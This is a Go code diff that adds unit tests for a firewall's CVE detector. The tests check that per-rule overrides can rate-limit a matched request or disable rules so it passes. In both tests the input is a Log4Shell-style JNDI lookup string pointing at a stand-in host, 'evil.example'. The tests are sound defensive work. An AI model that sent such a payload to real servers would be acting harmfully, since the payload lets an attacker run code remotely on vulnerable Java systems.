@@ -1,6 +1,7 @@
 package rules
 
 import (
+	"encoding/json"
 	"net"
 	"testing"
 
@@ -113,6 +114,76 @@ func TestCVEDetectorRuleOverridePreventsAutoDrop(t *testing.T) {
 	}
 	if result.ResponseStatusCode() != 429 {
 		t.Fatalf("expected rate limit status 429, got %d", result.ResponseStatusCode())
+	}
+}
+
+func TestCVEDetectorPatternOverridePreventsAutoDrop(t *testing.T) {
+	cfg := store.DefaultProtectionConfig()
+	cfg.CVEEnabled = true
+	cfg.CVEAction = "intercept"
+	cfg.CVEAutoDropCritical = true
+	cfg.CVEAutoDropHigh = true
+	rawQuery := "x=${jndi:ldap://evil.example/a}"
+	req := cve.BuildCVERequest("/", rawQuery, map[string]string{}, nil, "")
+	matches := cve.NewCVEDetector().Detect(req)
+	if len(matches) == 0 {
+		t.Fatal("expected test request to produce CVE matches")
+	}
+	overrides := make(map[string]cve.CVERuleOverride, len(matches))
+	for _, match := range matches {
+		overrides[match.Pattern] = cve.CVERuleOverride{Action: "rate_limit"}
+	}
+	rawOverrides, err := json.Marshal(overrides)
+	if err != nil {
+		t.Fatalf("marshal CVE pattern overrides: %v", err)
+	}
+	cfg.CVERulesConfig = string(rawOverrides)
+
+	phase := &cvePhase{cfg: &cfg, detector: cve.NewCVEDetector()}
+	result, stop := phase.Execute(&pipeline.RequestCtx{
+		Path:     "/",
+		RawQuery: rawQuery,
+		Headers:  map[string]string{},
+	})
+	if !stop {
+		t.Fatal("expected CVE hit to stop the pipeline")
+	}
+	if result.Type != action.RateLimit {
+		t.Fatalf("expected pattern override action to win, got %q", result.Type)
+	}
+}
+
+func TestCVEDisabledRuleOverridePassesWhenAllMatchesDisabled(t *testing.T) {
+	cfg := store.DefaultProtectionConfig()
+	cfg.CVEEnabled = true
+	rawQuery := "x=${jndi:ldap://evil.example/a}"
+	req := cve.BuildCVERequest("/", rawQuery, map[string]string{}, nil, "")
+	matches := cve.NewCVEDetector().Detect(req)
+	if len(matches) == 0 {
+		t.Fatal("expected test request to produce CVE matches")
+	}
+	disabled := false
+	overrides := make(map[string]cve.CVERuleOverride, len(matches))
+	for _, match := range matches {
+		overrides[match.CVEID] = cve.CVERuleOverride{Enabled: &disabled}
+	}
+	rawOverrides, err := json.Marshal(overrides)
+	if err != nil {
+		t.Fatalf("marshal CVE overrides: %v", err)
+	}
+	cfg.CVERulesConfig = string(rawOverrides)
+
+	phase := &cvePhase{cfg: &cfg, detector: cve.NewCVEDetector()}
+	result, stop := phase.Execute(&pipeline.RequestCtx{
+		Path:     "/",
+		RawQuery: rawQuery,
+		Headers:  map[string]string{},
+	})
+	if stop {
+		t.Fatal("expected disabled CVE rules to pass")
+	}
+	if result != action.Pass() {
+		t.Fatalf("expected pass result, got %#v", result)
 	}
 }
 
